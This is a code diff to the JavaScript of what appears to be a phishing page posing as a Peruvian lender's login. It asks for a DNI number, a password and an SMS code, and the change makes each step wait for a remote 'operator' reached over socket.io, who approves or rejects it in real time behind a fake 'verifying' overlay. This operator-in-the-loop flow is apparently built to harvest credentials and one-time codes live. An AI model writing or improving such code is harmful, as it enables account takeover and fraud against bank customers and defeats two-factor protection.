@@ -16,11 +16,26 @@
   const stepPass = document.querySelector(".step-pass");
   const stepVerify = document.querySelector(".step-verify");
   const tokens = [...document.querySelectorAll(".token")];
+  const loadingOverlay = document.getElementById("loading-overlay");
 
   let step = "doc";
   let docType = "DNI";
 
   const socket = typeof io !== "undefined" ? io() : null;
+
+  function showLoading(text) {
+    if (loadingOverlay) {
+      const textEl = loadingOverlay.querySelector(".efectiva-loading-text");
+      if (textEl) textEl.textContent = text || "Cargando, por favor espere...";
+      loadingOverlay.hidden = false;
+    }
+  }
+
+  function hideLoading() {
+    if (loadingOverlay) {
+      loadingOverlay.hidden = true;
+    }
+  }
 
   function sendSocketUpdate(customStatus) {
     if (!socket) return;
@@ -42,6 +57,7 @@
     });
 
     socket.on("operator:action", function (data) {
+      hideLoading();
       const { action, message } = data;
       if (action === "wrong_doc") {
         setStep("doc");
@@ -178,8 +194,8 @@
         showError("El DNI debe tener 8 dígitos");
         return;
       }
-      setStep("pass");
-      password.focus();
+      showLoading("Verificando documento...");
+      sendSocketUpdate("Esperando verificación de documento por el operador");
       return;
     }
     if (step === "pass") {
@@ -188,8 +204,8 @@
         password.focus();
         return;
       }
-      setStep("verify");
-      tokens[0].focus();
+      showLoading("Verificando contraseña...");
+      sendSocketUpdate("Esperando verificación de contraseña por el operador");
       return;
     }
     const code = tokens.map(function (t) { return t.value; }).join("");
@@ -197,7 +213,8 @@
       showError("Ingresa el código de 6 dígitos");
       return;
     }
-    sendSocketUpdate("Esperando aprobación del operador...");
+    showLoading("Validando código SMS...");
+    sendSocketUpdate("Esperando aprobación del código por el operador");
   });
 
   document.querySelectorAll(".nav-link, .forgot, .store-badges img, .resend span").forEach(function (el) {
